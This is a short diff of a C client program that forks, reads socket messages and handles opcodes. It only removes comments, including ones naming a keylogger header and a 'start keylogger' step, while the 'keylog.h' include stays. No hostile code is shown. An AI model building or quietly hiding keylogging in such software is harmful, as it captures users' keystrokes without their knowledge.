@@ -6,7 +6,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <pthread.h>
-#include "keylog.h" // Include the keylogger header
+#include "keylog.h" 
 #include "constraints.h"
 #include "messageManager.h"
 #include "clientManager.h"
@@ -22,7 +22,7 @@ int main()
 
     if (pid < 0)
     {
-        // Fork failed
+        
         perror("Fork failed");
         exit(1);
     }
@@ -89,9 +89,7 @@ int main()
         // printf("Recieved: %s(opcode %c)", msg.buffer, msg.opCode);
         handleOpcode(msg);
     }
-    // Pornire Keylogger
-
-    // Close the socket
+    
     close(sock);
 
     return 0;
